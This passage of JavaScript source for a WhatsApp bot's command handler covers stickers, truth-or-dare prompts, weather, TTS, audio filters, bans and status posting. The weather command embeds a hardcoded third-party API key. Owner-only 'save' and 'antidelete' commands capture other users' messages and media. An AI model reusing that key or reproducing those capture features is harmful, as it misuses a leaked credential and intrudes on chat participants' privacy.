console.log('Final edit successful.');
} catch (error) {
console.error('Error during final edit:', error);
}
}, 12000); // 12000 ms = 12 seconds
} catch (error) {
console.error('Error sending initial message:', error);
}
}
break;


case 'support': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
const support = `Wa channel:- https://whatsapp.com/channel/0029Vb6nSFL2phHV7Eyw9F3B\n\ngroup:- https://chat.whatsapp.com/GoJQ2iZkPWSBLvoHE9Qhh7\n\nTg channel:- https://t.me/pixelmdbotsupport`
m.reply(support)
}
break

case 'steal': case 'stickerwm': case 'take': case 'wm': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!/image|video/.test(mime)) return m.reply(example("reply to a sticker "))   
const getRandom = (ext) => {
return `${Math.floor(Math.random() * 10000)}${ext}`
  }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : (m.pushName)
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await donwiz.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await donwiz.sendMessage(m.chat,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
break
			
			case 'dare':
			if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
              const dare =[             
"Send a voice note saying I’m the coolest person alive",
"Do a silly dance in public and send a video",
"Send a photo of your messy hair",
"Write a rap about your day and share it",
"Send a funny GIF that describes your mood",
"Share a childhood photo",
"Do your best animal sound impression and send a voice note",
"Write a short breakup text to your favorite food",
"Send a video of you walking like a zombie",
"Take a mirror selfie with your weirdest pose",
"Send a picture of what’s in your fridge",
"Make a sandwich with 5 random ingredients and show it",
"Send a voice note laughing like a villain",
"Write and send a fake news headline about yourself",
"Send a selfie with the funniest filter you can find",
"Do your best celebrity impression and send a voice note",
"Send a photo of the last thing you ate",
"Write a haiku about pizza",
"Record a voice note saying your name like a robot",
"Send a picture of your feet with socks on",
"Do a prank call and record the audio (if legal)",
"Send a picture of your hand in an awkward pose",
"Record a weather report in a dramatic voice",
"Send a photo of the last meme you saved",
"Write a dramatic monologue about your favorite snack",
"Record yourself trying to sing opera",
"Send a photo of your favorite shoes",
"Do a runway walk and send a video",
"Send a voice note whispering your favorite food",
"Write a short scary story in 5 sentences",
"Send a photo of your school bag or work setup",
"Make a sad face selfie and send it",
"Send a picture of your favorite mug or cup",
"Send a tongue twister and try to say it fast in a voice note",
"Do a TikTok dance (even if you don’t use TikTok) and share it",
"Record yourself saying 5 random facts about frogs",
"Send a voice note with your best fake sneeze",
"Share your most recent search on Google",
"Send a photo of your hands making a heart",
"Send a video doing the robot dance",
"Write a song about toothpaste and share it",
"Send a voice note trying to sing like a baby",
"Take a photo holding a spoon like a microphone",
"Record yourself clapping with your feet",
"Send a picture of something green around you",
"Do a fake weather forecast for tomorrow",
"Send a selfie with the weirdest face you can make",
"Write a poem using only food names",
"Record a voice note saying a movie scene dramatically",
"Send a photo of your current outfit",
"Do a fashion show walk with music and send a video",
"Send a video of you pretending to be a cooking show host",
"Send a picture of your toothbrush",
"Write a love letter to your favorite snack",
"Record yourself saying ‘I’m the boss’ in three different accents",
"Send a photo of something that makes you happy",
"Try to balance something on your head and send a photo",
"Send a screenshot of your lock screen",
"Do a funny slow-motion walk and share the video",
"Record yourself making up a new language",
"Send a photo of something purple",
"Send a selfie with something random on your head",
"Write a short story about a superhero banana",
"Send a video of you pretending to be a news reporter",
"Share a picture of the view outside your window",
"Record a voice note of you singing in the shower voice",
"Send a photo of your socks",
"Do a dramatic reading of your last text and send it",
"Send a photo of your favorite gadget",
"Write a joke that ends with a twist",
"Send a video pretending to be a cat",
"Record a voice note talking in slow motion",
"Send a funny photo of your pet or pretend one",
"Do a short workout and show the sweaty proof",
"Write a text as if you were in medieval times",
"Send a photo of your favorite snack combo",
"Sing the alphabet backward and record it",
"Send a video of you reacting to a sour candy",
"Write a short rap about sleep",
"Send a photo of a weird object in your room",
"Do your best villain laugh and send a voice note",
"Send a screenshot of your favorite emoji usage",
"Write a diary entry from the perspective of your phone",
"Send a video of you pretending to cry dramatically",
"Make a crown out of paper and wear it in a photo",
"Send a photo of your shadow",
"Write a spooky ghost message",
"Record a voice note of you trying to imitate Siri or Google Assistant",
"Send a photo of you hugging a pillow",
"Do a slow-motion spin and send the video",
"Send a picture of a funny doodle you made",
"Write a review of a food you just made up",
"Record yourself saying a sentence backward",
"Send a photo of your open fridge",
"Do your best robot impression and record it",
"Send a video of you lip-syncing to a random song",
"Write a poem about slippers",
"Send a photo of your favorite drink",
"Record yourself giving a motivational speech",
"Send a picture of your favorite childhood toy (or describe it)",
"Write a fake commercial for toothpaste and record it",
"Send a video of you clapping rhythmically",
"Record yourself making up a new handshake with the air",
"Send a photo of your reflection (mirror or otherwise)",
"Write a short sci-fi story in under 100 words",
"Send a voice note saying 'banana' 10 times in different accents",
"Send a photo of something that starts with the letter ‘M’",
"Record yourself doing a dramatic movie trailer voice",
"Write a rap about your morning routine",
"Send a screenshot of your playlist",
"Send a picture of your hand shaped like a bird",
"Record a voice note of your best cartoon voice",
"Send a funny meme you made or caption a random image",
"Write a poem about socks",
"Send a video of you pretending to do a cooking show",
"Send a selfie pretending to be surprised",
"Do a silly challenge with your eyes closed and send proof",
"Send a voice note giving fake life advice",
"Send a video of you pretending to be a superhero",
"Write a love letter to your bed",
"Send a screenshot of your most used app",
"Send a voice note whispering a secret",
"Send a video of you doing air guitar",
"Write a poem about toothpaste",
"Send a photo of something blue",
"Do 20 jumping jacks and send proof",
"Send a selfie with a drawn-on mustache (real or app)",
"Send a picture of your shoes outside",
"Record a voice note of you doing a tongue twister",
"Send a photo of your hand drawing a smiley face",
"Write a fake apology note to your socks",
"Send a photo of something that makes you laugh",
"Send a picture of the last thing you touched",
"Record yourself pretending to be on a reality show",
"Send a photo of a plant or leaf",
"Do a fake interview with yourself and share it",
"Send a video of you playing air drums",
"Send a selfie pretending you're in a serious movie",
"Write a news report about your last meal",
"Send a photo of something round",
"Send a video of your reaction to cold water on your face",
"Record a weather report as if you were on Mars",
"Write a dramatic love letter to your phone charger",
"Send a picture of your fingers shaped like a heart",
"Send a voice note in your best radio host voice",
"Send a video saying tongue twisters without laughing"
]
              const pixeldare = dare[Math.floor(Math.random() * dare.length)]
              await donwiz.sendMessage(m.chat, {text: pixeldare}, {quoted: m})
              break
              
              	case 'truth':
              	if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
              const truth =[
"If you had to relive one day from your life, which would it be and why?",
"What’s a lie you once told that you still feel guilty about?",
"What’s something you’ve never told your parents?",
"What’s the one thing you’d never want to lose?",
"Who was your first ever crush?",
"What’s something you’ve done that still makes you cringe?",
"What’s one mistake you wish you could erase?",
"What’s a goal you’re proud of hitting?",
"If you could trade lives with a friend for a day, who would it be?",
"What’s a secret you’ve never told anyone?",
"What memory from your childhood still makes you smile?",
"What’s one thing you hope to achieve before the year ends?",
"If you had a free plane ticket right now, where would you go?",
"What hobby would you do every day if you could?",
"What’s the most random thing you’ve ever done just for fun?",
"What kind of music makes you feel alive?",
"If you could meet any person from history, who would it be and why?",
"What’s a decision that changed your life?",
"What book genre do you enjoy the most and why?",
"If a famous person asked you on a date, who would you want it to be?",
"What’s something about yourself you truly admire?",
"What kind of movies do you love and why?",
"If you swapped roles with your parents for a day, what would you do differently?",
"What’s a relationship that taught you the most?",
"What food brings back good memories for you?",
"If you could pick one superpower, what would it be and why?",
"What are you most thankful for right now?",
"What sport do you enjoy watching or playing, and why?",
"If you could go back to your younger self, what advice would you give?",
"What’s a problem you faced that helped you grow?",
"What’s a festival or concert you wish you could go to?",
"If future-you visited for a few minutes, what would you ask?",
"What’s something exciting you want to do in the next few years?",
"What’s your dream vacation spot?",
"If you could own any animal as a pet, what would you choose?",
"What’s one thing that’s been hard for you lately?",
"What holiday means the most to you and why?",
"If you had to take a trip with a famous person, who would you pick?",
"What’s something you achieved in the last year that you’re proud of?",
"What kind of restaurants do you enjoy most and why?",
"What’s something you pretend to like but secretly don’t?",
"What’s the weirdest dream you can remember?",
"What’s a moment that completely caught you off guard?",
"Who’s someone that’s had a big impact on your life?",
"What’s one habit you’re trying to break?",
"What’s a compliment you’ve received that stuck with you?",
"What’s a fear you’ve overcome?",
"What’s something you’re really good at but rarely talk about?",
"What’s a moment that made you feel really alive?",
"Who was your first best friend, and are you still in touch?",
"What’s something small that always cheers you up?",
"What’s the kindest thing someone has done for you?",
"What’s a topic you could talk about for hours?",
"What’s one thing you’re really passionate about?",
"What’s a tradition from your culture or family you love?",
"What’s a memory that always makes you laugh?",
"What’s something you learned the hard way?",
"What’s a belief you had as a kid that you laugh about now?",
"What’s something you wish more people understood about you?",
"What’s your love language?",
"What’s a song that always reminds you of someone?",
"What’s a place you’ve visited that felt magical?",
"What’s something you wish you could tell your younger self?",
"What’s the most meaningful gift you’ve ever received?",
"What’s a story you’ve never told anyone until now?",
"What’s a subject or topic you’re secretly obsessed with?",
"What’s something you miss about being younger?",
"What’s something you wish you were better at?",
"Who do you turn to when life gets overwhelming?",
"What’s a trait you admire in others that you wish you had more of?",
"What’s something you’ve been avoiding?",
"What’s a recent moment that made you feel really proud?",
"What’s your dream job and why?",
"What’s a character from a book or movie that reminds you of yourself?",
"What’s something you’re scared to try but want to?",
"What’s a goal you’ve had for a long time but haven’t reached yet?",
"What’s one thing you wish people noticed about you?",
"What’s your idea of a perfect weekend?",
"What’s something you’ve done that most people wouldn’t guess?",
"What’s a childhood fear you still kind of have?",
"What’s a tradition you want to pass on someday?",
"What’s something you regret not saying when you had the chance?",
"What’s your biggest insecurity and how do you deal with it?",
"What’s something you’re working on improving about yourself?",
"What’s a movie or book that changed the way you think?",
"What’s the most spontaneous trip you’ve taken?",
"What’s something you learned recently that surprised you?",
"What’s a challenge you’re currently facing?",
"What’s something you feel people misunderstand about you?",
"What’s a question you wish someone would ask you?",
"What’s something that instantly makes you smile?",
"What’s your go-to comfort activity when you’re sad?",
"What’s something you used to love that you outgrew?",
"What’s your biggest distraction in life?",
"What’s a song lyric that hits you hard?",
"What’s something you’ve done that you never expected to do?",
"What’s a talent you have that not many people know about?",
"What’s a moment that changed the way you see the world?",
"What’s the last thing that made you cry?",
"What’s a time you surprised yourself?",
"What’s your guilty pleasure?",
"What’s a place you dream of living in someday?",
"What’s something you want to learn but haven’t started?",
"What’s a decision you made that changed everything?",
"What’s something from your past that still affects you?",
"What’s something that keeps you up at night?",
"What’s something about growing up that you never expected?",
"What’s your biggest motivation right now?",
"What’s your relationship with social media like?",
"What’s something you once feared but no longer do?",
"What’s the best compliment you’ve ever gotten?",
"What’s your favorite way to relax?",
"What’s a moment where you felt completely seen or heard?",
"What’s something people always assume about you that isn’t true?",
"What’s the hardest goodbye you’ve ever said?",
"What’s a childhood dream you still hold onto?",
"What’s something that feels small but matters a lot to you?",
"What’s a question you ask yourself often?",
"What’s your biggest hope for your future?",
"What’s a risk you took that paid off?",
"What’s a lesson you learned too late?",
"What’s something you hope people remember about you?",
"What’s a relationship you cherish the most?",
"What’s something that used to scare you but now feels normal?",
"What’s your biggest source of stress right now?",
"What’s something you want to say to someone but haven’t?",
"What’s something you did purely for yourself?",
"What’s something you’ve always wanted to try, but haven’t yet?",
"What’s a rule you always follow, no matter what?",
"What’s something you’re grateful your past self did?",
"What’s a memory you wouldn’t trade for anything?",
"What’s a belief or idea that guides your life?",
"What’s something you value most in friendships?",
"What’s a moment you realized you’d changed?",
"What’s a compliment you wish someone would give you?",
"What’s something you’re trying to let go of?",
"What’s a fear you want to conquer this year?",
"What’s your personal definition of success?",
"What’s a habit you’re trying to build?",
"What’s a goal that scares you in a good way?",
"What’s a promise you’ve made to yourself?",
"What’s something that always makes you feel at home?",
"What’s your biggest dream — the one you’re scared to say out loud?"
]
              const pixeltruth = truth[Math.floor(Math.random() * truth.length)]
              await donwiz.sendMessage(m.chat, {text: pixeltruth}, {quoted: m})
              break
              
case 'weather':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example('location'))
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           donwiz.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break

case 'getpp': 
case 'pp': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  let users = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net')
  try {
    avatar = await donwiz.profilePictureUrl(users, "image")
  } catch {
    avatar = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
  }
  await donwiz.sendMessage(m.chat, {image: {url: avatar }, caption: `Profile picture of @${users.split('@')[0]}`, contextInfo: { mentionedJid: [users] } }, {quoted: m })
} 
break

case 'ban': {
if (!isOwner) return m.reply(msg.owner)
let Donwiz = '2349131021928'
let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : '')
if (!user) return m.reply(example('Reply or tag a user!'))
if (user === botNumber) return m.reply('I cannot ban myself!')
if (user === Donwiz +"@s.whatsapp.net") return m.reply('I cannot ban my Creator!')
if (!global.db.users[user]) global.db.users[user] = {}
if (global.db.users[user].banned) return m.reply(`User ${user.split('@')[0]} is already banned!`)
global.db.users[user].banned = true
m.reply(`User ${user.split('@')[0]} has been banned from using the bot command!`)
}
break

case 'unban': {
if (!isOwner) return m.reply(msg.owner)
let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : '')
if (!user) return m.reply(example('Reply or tag a user!'))
if (!global.db.users[user]) global.db.users[user] = {}
if (!global.db.users[user].banned) return m.reply(`User ${user.split('@')[0]} is not banned!`)
global.db.users[user].banned = false
m.reply(`User ${user.split('@')[0]} has been unbanned and can now use the bot!`)
}
break

case 'say': case 'tts': case 'gtts':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
    try {
    let text = (args.length > 1) ? args.slice(1).join(" ") : q;
     if (!text){
        return m.reply(`*Missing text!*\n\nUse one of the following voice styles:\n
🔊 *Available Voices:*
• \`male\` – American Male (default)
• \`female\` – British Female
• \`deep\` – Deep Male
• \`slow\` – Slower Speech
• \`fast\` – Faster Speech
• \`ng\` – Nigerian Accent
• \`au\` – Australian Accent

📝 *Usage Examples:*
• .tts male Hello there
• .tts female Welcome to the group
• .tts deep This is a deep voice
• .tts ng How are you all today?

Use any style + your text after the command.`);
      }
      
      let voiceLanguage = 'en-US';
      let speed = false;
      const style = args[0]?.toLowerCase();
      
      switch (style) {
        case "male":
          voiceLanguage = "en-US";
          break;
        case "female":
          voiceLanguage = "en-GB";
          break;
        case "deep":
          voiceLanguage = "en-IN";
          break;
        case "slow":
          speed = true;
          break;
        case "fast":
          speed = false;
          break;
        case "ng":
          voiceLanguage = "en-NG";
          break;
        case "au":
          voiceLanguage = "en-AU";
          break;
        default:
          voiceLanguage = "en-US";
      }
  
      if (text.length > 200) return m.reply("Please keep the text under 200 characters.");
      
      const url = googleTTS.getAudioUrl(text, {
        lang: voiceLanguage,
        slow: speed,
        host: 'https://translate.google.com'
      });
      
      await donwiz.sendMessage(from, {
        audio: { url },
        mimetype: 'audio/mpeg',
        ptt: true
      }, { quoted: m });
      
    } catch (err) {
      console.error("TTS Error:", err);
      m.reply("❌ Error generating speech. Try again later.");
    }
}
break
        
case 'repo': case 'repository': {
  try {
    const response = await axios.get(`https://api.github.com/repos/Ednut001/arch-Md`)
    if (response.status === 200) {
      const repoData = response.data
      const formattedInfo = `*Repository Name :* ${repoData.name}\n*Description :* ${repoData.description}\n*Owner :* ${repoData.owner.login}\n*Stars :* ${repoData.stargazers_count}\n*Forks :* ${repoData.forks_count}\n*session :* ${global.scan}\n\n*URL :* ${repoData.html_url}\n`;
      reply4(formattedInfo);
    } else {
      await m.reply(`Unable to fetch repository information`)
    }
  } catch (error) {
    console.error(error)
    await m.reply(`Repository currently not available `)
  }
}
break

case 'twitter': case 'twitterdl': case 'twitterdl': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
    if (global.db.users[m.sender].banned) return m.reply(msg.ban)
	if (!args[0]) return m.reply(example(`media link`))
	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return m.reply('Link Invalid!')
          try {
          let { SD, HD, desc, thumb, audio } = await api.twitter(args[0])
          let te = ` 
° Description: ${desc}\n\n© ᴀʀᴄʜ ᴍᴅ ²⁵`
donwiz.sendMessage(m.chat, {video: {url:HD}, caption: te}, {quoted: m})
} catch (e) {
  	m.reply(`Verify that the link is from Twitter`)
	}
}
break

  case 'banchat':
  case 'bangc':{
    if (!m.isGroup) return m.reply(msg.group)
    if (!isOwner) return m.reply(msg.owner)
    if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
    if (global.db.groups[m.chat].banned === true) return m.reply('this group has already been banned from using the bot command earlier!')
    global.db.groups[m.chat].banned = true
    m.reply(`Ban group feature enabled ${botname} won't work here!`)
    }
    break;
    

case 'autobio': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (args[0] === 'on') {
if (global.db.settings.autobio === true) return m.reply('Auto bio already enabled!')
global.db.settings.autobio = true
m.reply('Auto bio enabled!')
} else if (args[0] === 'off') {
if (global.db.settings.autobio === false) return m.reply('Auto bio already disabled!')
global.db.settings.autobio = false
m.reply('Auto bio disabled!')
} else {
m.reply(example('on/off'))
}
}
break;

case 'antidelete': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (args[0] === 'on') {
if (global.db.settings.antidelete === true) return m.reply('Antidelete already enabled!')
global.db.settings.antidelete = true
m.reply('Antidelete enabled!')
} else if (args[0] === 'off') {
if (global.db.settings.antidelete === false) return m.reply('Antidelete already disabled!')
global.db.settings.antidelete = false
m.reply('Antidelete disabled!')
} else {
m.reply(example('on/off'))
}
}
break;

case 'chatbot': {
  if (m.isGroup) {
    if (global.db.groups[m.chat].banned) return;
  }
  if (global.db.users[m.sender].banned) return m.reply(msg.ban);
  if (!isOwner) return m.reply(msg.owner);
  if (args[0] === 'on') {
    if (global.db.settings.chatbot === true) return m.reply('_Chatbot already enabled!_');
    global.db.settings.chatbot = true;
    m.reply('_Chatbot enabled!_');
  } else if (args[0] === 'off') {
    if (global.db.settings.chatbot === false) return m.reply('_Chatbot already disabled!_');
    global.db.settings.chatbot = false;
    m.reply('_Chatbot disabled!_');
  } else {
    m.reply(`_Example: ${prefix}chatbot on/off_`);
  }
}
break;

case 'autolevelup': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (args[0] === 'on') {
if (global.db.settings.levelup === true) return m.reply('Autolevelup already enabled!')
global.db.settings.levelup = true
m.reply('Autolevelup enabled!')
} else if (args[0] === 'off') {
if (global.db.settings.levelup === false) return m.reply('Autolevelup already disabled!')
global.db.settings.levelup = false
m.reply('Autolevelup disabled!')
} else {
m.reply(example('on/off'))
}
}
break;


case 'download':
case 'save':
case 'sv': {
  if (m.isGroup) {
    if (global.db.groups[m.chat].banned) return
  }
  if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!isOwner) return
  let quotedMessage = m.msg.contextInfo.quotedMessage
  if (!quotedMessage) return m.reply(example("message or reply to chat or media"))
  if (quotedMessage) {
    if (quotedMessage.conversation) {
      donwiz.sendMessage(botNumber, { text: quotedMessage.conversation},{quoted: m})
    }
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await donwiz.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        donwiz.sendMessage(botNumber, { image: { url: imageUrl }, caption: imageCaption},{quoted: m});
      }
       if (quotedMessage) {
      if (quotedMessage.audioMessage) {;
        let audioUrl = await donwiz.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
        donwiz.sendMessage(botNumber, {audio: {url: audioUrl}, mimetype: "audio/mpeg"},{quoted: m})
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await donwiz.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        donwiz.sendMessage(botNumber, { video: { url: videoUrl }, caption: videoCaption}, {quoted: m});
      }
    }
    }
  }
}
break

case 'unbanchat':
case 'unbangc': {
if (!m.isGroup) return m.reply(msg.group)
if (!isOwner) return m.reply(msg.owner)
if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
if (global.db.groups[m.chat].banned === false) return m.reply('This group is not banned from using the bot command!')
global.db.groups[m.chat].banned = false
m.reply(`Ban group feature disabled ${botname} can now be used here!`)
}
break;

case "autosend": case "astatus": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (args.length < 1) return m.reply(example("on/off"))
if (args[0] === "on") {
if (global.db.settings.send) return m.reply('Already on')
global.db.settings.send = true
m.reply('Autosend turned on successfully')
} else if (args[0] === "off") {
if (!global.db.settings.send) return m.reply('Already off')
global.db.settings.send = false
m.reply('Autosend turned off successfully')
}
}
break

case 'pindl': case 'img':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
   if (!text) return m.reply(example(`query 3 or url`))
    let [query, count] = text.split(' ')
    let imgCount = 5
    if (text.indexOf(' ') !== -1) {
        const lastWord = text.split(' ').pop()
        if (!isNaN(lastWord) && lastWord.trim() !== '') {
            imgCount = parseInt(lastWord)
            query = text.substring(0, text.lastIndexOf(' '))
        } else {
            query = text
        }
    } else {
        query = text
    }
    try {
        const results = await pinterest(query)
        if (results.length === 0) return m.reply(`No results found for "${query}". Try another search term.`)
        const imagesToSend = Math.min(results.length, imgCount)
        m.reply(`Sending ${imagesToSend} Pinterest images for "${query}"...`)
        for (let i = 0; i < imagesToSend; i++) {
            await donwiz.sendMessage(m.chat, { image: { url: results[i].image } }) 
        }
    } catch {
        m.reply('Error occurred while fetching Pinterest images. Please try again later.')
    }
}
break


case 'setcmd':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
global.db.sticker = global.db.sticker || {}
    if (!m.quoted) return m.reply(example('reply a sticker'))
    if (!m.quoted.fileSha256) return m.reply('SHA256 Hash Missing')
    if (!text) return m.reply(example(`text`))
    let sticker = global.db.sticker
    let hash = m.quoted.fileSha256.toString('base64')
    if (sticker[hash] && sticker[hash].locked) return m.reply('You do not have permission to change this sticker command.')
    sticker[hash] = {
        text,
        mentionedJid: m.mentionedJid,
        creator: m.sender,
        at: + new Date,
        locked: false,
    }
    m.reply(`Succeess!`)
}
break

case 'delcmd':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
let hash = text
    if (m.quoted && m.quoted.fileSha256) hash = m.quoted.fileSha256.toString('hex')
    if (!hash) return m.reply(`hash not found`)
    let sticker = global.db.sticker
    if (sticker[hash] && sticker[hash].locked) return m.reply('You dont have permission to delete this sticker command')
    delete sticker[hash]
    m.reply(`sucess`)
}
break

case 'reactch': {
if (!isOwner) return m.reply(msg.owner);

if (!text || args.length < 2) {
    return m.reply(`::`);
}

const link = args[0];
const reactionText = args.slice(1).join(' ').toLowerCase();

if (!link.includes("whatsapp.com/channel/")) {
    return m.reply('');
    }

    const emoji = reactionText.split('').map(char => {
      if (char === ' ') return '―';
      return stylizedChars[char] || char;
    }).join('');

    const parts = link.split('/');
    const channelId = parts[4];
    const messageId = parts[5];

    if (!channelId || !messageId) {
      return m.reply('');
}

try {
    const channelMeta = await donwiz.newsletterMetadata("invite", channelId);
    await donwiz.newsletterReactMessage(channelMeta.id, messageId, emoji);
    
    m.reply(` *Reaction Sent!*\n\n• *Channel:* ${channelMeta.name}\n• *Reaction:* ${emoji}`);
} catch (err) {
    console.error(err);
   m.reply(` *Failed to send reaction*\n\`\`\`${err.message || err}\`\`\``);
}
}
break

case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                let media = await donwiz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                donwiz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(example(`reply to an audio`))
                } catch (e) {
                m.reply(e)
                }
                break

case 'status': {
  if (m.isGroup) {
    if (global.db.groups[m.chat].banned) return;
  }
  if (global.db.users[m.sender].banned) return m.reply(msg.ban);
  if (!isOwner) return m.reply(msg.owner);
  const baileys = require("baileys");
  async function fetchParticipants(...jids) {
    let results = [];
    for (const jid of jids) {
      let { participants } = await donwiz.groupMetadata(jid);
      participants = participants.map(({ id }) => id);
      results = results.concat(participants);
    }
    return results;
  }
  async function mentionStatus(jids, content) {
    const msg = await baileys.generateWAMessage(baileys.STORIES_JID, content, { upload: donwiz.waUploadToServer });
    let statusJidList = [];
    for (const _jid of jids) {
      if (_jid.endsWith("@g.us")) {
        for (const jid of await fetchParticipants(_jid)) {
          statusJidList.push(jid);
        }
      } else {
        statusJidList.push(_jid);
      }
    }
    statusJidList = [...new Set(statusJidList)];
    await donwiz.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id, statusJidList, additionalNodes: [
      { tag: "meta", attrs: {}, content: [
        { tag: "mentioned_users", attrs: {}, content: jids.map((jid) => ({ tag: "to", attrs: { jid }, content: undefined })) }
      ] }
    ]});
    for (const jid of jids) {
      let type = jid.endsWith("@g.us") ? "groupStatusMentionMessage" : "statusMentionMessage";
      await donwiz.relayMessage(jid, { [type]: { message: { protocolMessage: { key: msg.key, type: 25 } } } }, { additionalNodes: [
        { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
      ]});
    }
    m.reply("Status posted successfully!");
    return msg;
  }
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || '';
  let content = {};
  if (mime) {
    let media = await q.download();
    if (/image/.test(mime)) {
      content.image = media;
    } else if (/video/.test(mime)) {
      content.video = media;
    } else if (/audio/.test(mime)) {
      content.audio = media;
    } else {
      return m.reply("File types are not supported!!");
    }
    if (q.text) content.caption = q.text;
  } else if (args[0]) {
    let text = m.text.replace(`${global.prefix}status `, '');
    let index = text.indexOf('|');
